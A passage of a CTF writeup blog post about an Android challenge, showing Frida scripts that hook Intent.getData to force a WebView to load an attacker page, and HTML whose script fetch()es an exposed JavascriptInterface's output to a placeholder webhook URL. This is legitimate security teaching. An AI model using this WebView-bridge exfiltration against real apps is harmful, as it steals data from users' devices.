    <span class="o">}</span>  
  
    <span class="kd">static</span> <span class="o">{</span>  
        <span class="nc">System</span><span class="o">.</span><span class="na">loadLibrary</span><span class="o">(</span><span class="s">"o"</span><span class="o">);</span>  
    <span class="o">}</span>  
<span class="o">}</span>
</pre></table></code></div></div><p>As we can see, we only have access to the <code class="language-plaintext highlighter-rouge">d</code> method of the <code class="language-plaintext highlighter-rouge">JavascriptInterface</code> named client. Let’s use <code class="language-plaintext highlighter-rouge">Frida</code> to get the application to visit a URL of our choice, and then put some malicious Javascript on it.</p><p>Since no data is supplied with the intent, we first need to hook the <code class="language-plaintext highlighter-rouge">getData()</code> function, so that it returns a URI with a queryParameter named “web”, which will contain our URL. The frida script used for this can be seen below:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="nx">Java</span><span class="p">.</span><span class="nx">perform</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
	<span class="kd">var</span> <span class="nx">Intent</span> <span class="o">=</span> <span class="nx">Java</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">android.content.Intent</span><span class="dl">'</span><span class="p">);</span>
	<span class="nx">Intent</span><span class="p">.</span><span class="nx">getData</span><span class="p">.</span><span class="nx">overload</span><span class="p">().</span><span class="nx">implementation</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">-------------------HOOKED getData-----------------</span><span class="dl">"</span><span class="p">);</span>

		<span class="kd">var</span> <span class="nx">UriBuilder</span> <span class="o">=</span> <span class="nx">Java</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">android.net.Uri$Builder</span><span class="dl">'</span><span class="p">);</span>
		<span class="kd">var</span> <span class="nx">UriBuilderInstance</span> <span class="o">=</span> <span class="nx">UriBuilder</span><span class="p">.</span><span class="nx">$new</span><span class="p">();</span>
		<span class="kd">var</span> <span class="nb">String</span> <span class="o">=</span> <span class="nx">Java</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">java.lang.String</span><span class="dl">'</span><span class="p">);</span>
		<span class="kd">var</span> <span class="nx">str1</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">$new</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://something-here.eu.ngrok.io/test.html</span><span class="dl">"</span><span class="p">);</span>
		<span class="kd">var</span> <span class="nx">strKey</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">$new</span><span class="p">(</span><span class="dl">"</span><span class="s2">web</span><span class="dl">"</span><span class="p">)</span>
		<span class="nx">UriBuilderInstance</span><span class="p">.</span><span class="nx">appendQueryParameter</span><span class="p">(</span><span class="nx">strKey</span><span class="p">,</span><span class="nx">str1</span><span class="p">);</span>
		<span class="kd">var</span> <span class="nx">uri</span> <span class="o">=</span> <span class="nx">UriBuilderInstance</span><span class="p">.</span><span class="nx">build</span><span class="p">();</span>

		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">uri</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">uri</span><span class="p">.</span><span class="nx">getQueryParameter</span><span class="p">(</span><span class="dl">"</span><span class="s2">web</span><span class="dl">"</span><span class="p">));</span>
		
        <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">getData</span><span class="p">();</span>

		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">uri</span><span class="p">.</span><span class="nx">getQueryParameter</span><span class="p">(</span><span class="dl">"</span><span class="s2">web</span><span class="dl">"</span><span class="p">));</span>

		<span class="k">return</span> <span class="nx">uri</span><span class="p">;</span>
	
	<span class="p">};</span>
<span class="p">});</span>
</pre></table></code></div></div><p>And the HTML for the site hosted via <code class="language-plaintext highlighter-rouge">ngrok</code> can be found below:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c">&lt;!-- client is the name of the Android exposed object --&gt;</span>
HELLO WORLD
<span class="nt">&lt;script&gt;</span>
<span class="nx">fetch</span><span class="p">(</span><span class="s2">`https://webhook.site/your-webhook-here?msg=</span><span class="p">${</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">client</span><span class="p">.</span><span class="nx">d</span><span class="p">()))}</span><span class="s2">`</span><span class="p">);;;</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>My teammate found this way of getting the result of the <code class="language-plaintext highlighter-rouge">d</code> function. Since the <code class="language-plaintext highlighter-rouge">d</code> function returns a string we can simply call the function, Stringify it and convert it to base64 before visiting our webhook with the data in the url parameter “msg”.</p><p>This is done to simplify the solving process slightly, as the <code class="language-plaintext highlighter-rouge">h.s()</code> being returned in <code class="language-plaintext highlighter-rouge">d</code> is a native function, which would mean that normally we would have to find and reverse engineer the function found in <code class="language-plaintext highlighter-rouge">libo.so</code> to find out what it actually does or returns.</p><p>We view the site in the app on our emulator, and on the webhook we get the following a lookup with the following query string: <code class="language-plaintext highlighter-rouge">msg=ImJpMHNDVEZ7NG5kcjAxZF8xNSI=</code>, which decodes to <code class="language-plaintext highlighter-rouge">"bi0sCTF{4ndr01d_15"</code>, the first part of the flag!</p><p>Getting the second part of the flag is trivial at this point. We simply hook the <code class="language-plaintext highlighter-rouge">h.s()</code> method called implicitly via our <code class="language-plaintext highlighter-rouge">JavascriptInterface</code> to return <code class="language-plaintext highlighter-rouge">h.ss()</code> instead. We then have the following frida script:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="nx">Java</span><span class="p">.</span><span class="nx">perform</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
	<span class="kd">var</span> <span class="nx">Intent</span> <span class="o">=</span> <span class="nx">Java</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">android.content.Intent</span><span class="dl">'</span><span class="p">);</span>
	<span class="nx">Intent</span><span class="p">.</span><span class="nx">getData</span><span class="p">.</span><span class="nx">overload</span><span class="p">().</span><span class="nx">implementation</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">-------------------HOOKED getData-----------------</span><span class="dl">"</span><span class="p">);</span>

		<span class="kd">var</span> <span class="nx">UriBuilder</span> <span class="o">=</span> <span class="nx">Java</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">android.net.Uri$Builder</span><span class="dl">'</span><span class="p">);</span>
		<span class="kd">var</span> <span class="nx">UriBuilderInstance</span> <span class="o">=</span> <span class="nx">UriBuilder</span><span class="p">.</span><span class="nx">$new</span><span class="p">();</span>
		<span class="kd">var</span> <span class="nb">String</span> <span class="o">=</span> <span class="nx">Java</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">java.lang.String</span><span class="dl">'</span><span class="p">);</span>
		<span class="kd">var</span> <span class="nx">str1</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">$new</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://something-here.eu.ngrok.io/test.html</span><span class="dl">"</span><span class="p">);</span>
		<span class="kd">var</span> <span class="nx">strKey</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">$new</span><span class="p">(</span><span class="dl">"</span><span class="s2">web</span><span class="dl">"</span><span class="p">)</span>
		<span class="nx">UriBuilderInstance</span><span class="p">.</span><span class="nx">appendQueryParameter</span><span class="p">(</span><span class="nx">strKey</span><span class="p">,</span><span class="nx">str1</span><span class="p">);</span>
		<span class="kd">var</span> <span class="nx">uri</span> <span class="o">=</span> <span class="nx">UriBuilderInstance</span><span class="p">.</span><span class="nx">build</span><span class="p">();</span>

		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">uri</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">uri</span><span class="p">.</span><span class="nx">getQueryParameter</span><span class="p">(</span><span class="dl">"</span><span class="s2">web</span><span class="dl">"</span><span class="p">));</span>
		
        <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">getData</span><span class="p">();</span>

		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">uri</span><span class="p">.</span><span class="nx">getQueryParameter</span><span class="p">(</span><span class="dl">"</span><span class="s2">web</span><span class="dl">"</span><span class="p">));</span>

		<span class="k">return</span> <span class="nx">uri</span><span class="p">;</span>
	
	<span class="p">};</span>

	<span class="kd">var</span> <span class="nx">H</span> <span class="o">=</span> <span class="nx">Java</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">x.y.z.h</span><span class="dl">'</span><span class="p">);</span>	
	<span class="nx">H</span><span class="p">.</span><span class="nx">s</span><span class="p">.</span><span class="nx">overload</span><span class="p">(</span><span class="dl">"</span><span class="s2">java.lang.String</span><span class="dl">"</span><span class="p">).</span><span class="nx">implementation</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">arg1</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">-------------------HOOKED s-----------------</span><span class="dl">"</span><span class="p">);</span>
		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">The input arg1 is </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">arg1</span><span class="p">);</span>
		<span class="k">return</span> <span class="nx">H</span><span class="p">.</span><span class="nx">$new</span><span class="p">().</span><span class="nx">ss</span><span class="p">(</span><span class="nx">arg1</span><span class="p">);</span>
	<span class="p">};</span>
<span class="p">});</span>
</pre></table></code></div></div><p>We then get the final part of the flag: <code class="language-plaintext highlighter-rouge">"bi0sCTF{4ndr01d_15_50_vuln3r4bl3}"</code></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/android/'>android</a>, <a href='/categories/apk/'>APK</a>, <a href='/categories/reversing/'>reversing</a>, <a href='/categories/frida/'>frida</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/android/" class="post-tag no-text-decoration" >android</a> <a href="/tags/apk/" class="post-tag no-text-decoration" >apk</a> <a href="/tags/reversing/" class="post-tag no-text-decoration" >reversing</a> <a href="/tags/frida/" class="post-tag no-text-decoration" >frida</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=DroidComp writeup - BitisGabonica&amp;url=https://bitisg.github.io/posts/DroidComp/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=DroidComp writeup - BitisGabonica&amp;u=https://bitisg.github.io/posts/DroidComp/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://bitisg.github.io/posts/DroidComp/&amp;text=DroidComp writeup - BitisGabonica" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/DroidComp/">DroidComp writeup</a><li><a href="/posts/Faculty/">Faculty writeup</a><li><a href="/posts/Trick/">Trick writeup</a><li><a href="/posts/Seal/">Seal writeup</a><li><a href="/posts/Devzat/">Devzat writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy-box/">Easy-box</a> <a class="post-tag" href="/tags/medium-box/">medium-box</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/apk/">apk</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/jwt/">jwt</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Catch/"><div class="card-body"> <em class="timeago small" data-ts="1655820000" > 2022-06-21 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Catch writeup</h3><div class="text-muted small"><p> Summary This box was a very interesting box centered around a little .apk forensics as well as building valid and signed apks. We used api tokens found in the decompiled apk to access a let’s chat ...</p></div></div></a></div><div class="card"> <a href="/posts/APKrypt/"><div class="card-body"> <em class="timeago small" data-ts="1657717200" > 2022-07-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>APKrypt writeup</h3><div class="text-muted small"><p> Description Can you get the ticket without the VIP code? Writeup We receive an apk file, which we can then decompile via codium and the APKLab extension. The MainActivity.java file is seen below: ...</p></div></div></a></div><div class="card"> <a href="/posts/Pinned/"><div class="card-body"> <em class="timeago small" data-ts="1657717200" > 2022-07-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pinned writeup</h3><div class="text-muted small"><p> Description This app has stored my credentials and I can only login automatically. I tried to intercept the login request and restore my password, but this seems to be a secure connection. Can you ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Tar_and_feathers/" class="btn btn-outline-primary" prompt="Older"><p>Tar and Feathers - FE-CTF 2022 writeup</p></a> <a href="/posts/Artifacts/" class="btn btn-outline-primary" prompt="Newer"><p>Artifacts of dangerous Sightings writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/BitisGabonica1">BitisGabonica</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy-box/">Easy-box</a> <a class="post-tag" href="/tags/medium-box/">medium-box</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/apk/">apk</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/jwt/">jwt</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-4RZWBJKYF3"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-4RZWBJKYF3'); }); </script>
